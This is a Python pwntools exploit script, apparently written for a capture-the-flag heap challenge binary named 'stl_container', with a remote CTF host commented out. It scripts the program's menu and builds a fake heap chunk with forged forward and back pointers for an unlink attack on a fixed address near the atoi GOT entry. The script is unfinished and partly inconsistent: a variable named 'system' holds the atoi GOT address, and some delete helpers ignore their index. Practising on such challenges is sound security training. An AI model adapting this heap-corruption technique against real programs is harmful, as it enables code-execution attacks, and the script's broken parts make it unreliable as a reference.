#-*- coding:utf8 -*-

from pwn import *
context(log_level="debug")

#p = process(['./stl_container'], env={"LD_PRELOAD":"./libc-2.27.so"})
#p = process('./stl_container', env={'LD_PRELOAD': './libc-2.27.so'})
p = process('./stl_container')
#p = remote('134.175.239.26', 8848)
elf = ELF('./stl_container')
libc = ELF('./libc-2.27.so')

def addlist(content):
	p.sendlineafter('>> ', '1')
	p.sendlineafter('>> ', '1')
	p.sendafter('input data:', content)

def dellist(index):
	p.sendlineafter('>> ', '1')
	p.sendlineafter('>> ', '2')
	p.sendlineafter('index?\n', str(index))

def addvector(content):
	p.sendlineafter('>> ', '2')
	p.sendlineafter('>> ', '1')
	p.sendafter('input data:', content)

def delvector(index):
	p.sendlineafter('>> ', '2')
	p.sendlineafter('>> ', '2')
	p.sendlineafter('index?\n', str(index))

def addqueue(content):
	p.sendlineafter('>> ', '3')
	p.sendlineafter('>> ', '1')
	p.sendafter('input data:', content)

def delqueue(index):
	p.sendlineafter('>> ', '3')
	p.sendlineafter('>> ', '2')

def addstack(content):
	p.sendlineafter('>> ', '4')
	p.sendlineafter('>> ', '1')
	p.sendafter('input data:', content)

def delstack(index):
	p.sendlineafter('>> ', '4')
	p.sendlineafter('>> ', '2')

def exit():
	p.sendlineafter('>> ', '5')
target = 0x207000
atoi_got = elf.got['atoi']
atoi_plt = elf.plt['atoi']
system = elf.got['atoi']
log.info('atoi_got ----> p[%s] '%hex(atoi_got))
payload=''
fake_chunk  = p64(0) + p64(0x91)
fake_chunk += p64(target - 0x18) + p64(target - 0x10)
fake_chunk += 'a' * 0x70
fake_chunk += p64(0x90) + p64(0xa0)

addlist(fake_chunk)
raw_input()

dellist(0)
#gdb.attach(p, 'b menu')
p.interactive()

